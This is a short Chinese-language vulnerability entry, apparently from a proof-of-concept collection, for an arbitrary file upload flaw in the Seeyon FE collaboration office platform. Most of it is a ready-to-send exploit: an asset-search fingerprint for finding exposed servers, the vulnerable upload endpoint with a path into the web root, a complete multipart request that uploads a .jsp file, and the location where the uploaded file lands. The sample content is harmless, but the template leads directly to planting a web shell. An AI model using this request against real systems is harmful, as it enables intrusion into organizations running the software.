# 致远互联FE协作办公平台存在文件上传漏洞

- **系统**：致远OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="致远互联-FE"`
- **请求**：`POST /ufmail/uploadAccessory.jsp?action=save&temppath=\FE\jboss\server\default\deploy\fe.war\images\upload\&fileList= HTTP/1.1`

**请求体 / payload**
```
访问连接出现如下页面，表示可能存在漏洞
/ufmail/uploadAccessory.jsp
Host: xx.xx.xx.xx
Content-Length: 317
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBW0vKOPTpUvxDioC
Cookie: JSESSIONID=42DC2F023CF8A97A9F9233D8EF7C90CD
------WebKitFormBoundaryBW0vKOPTpUvxDioC
Content-Disposition: form-data; name="accessory"; filename="1.jsp"
Content-Type: application/octet-stream
123
------WebKitFormBoundaryBW0vKOPTpUvxDioC--

上传文件位置
/images/upload/1698660060205.jsp
```

**其他**
- 致远互联FE协作办公平台存在文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 致远互联-FE协作办公平台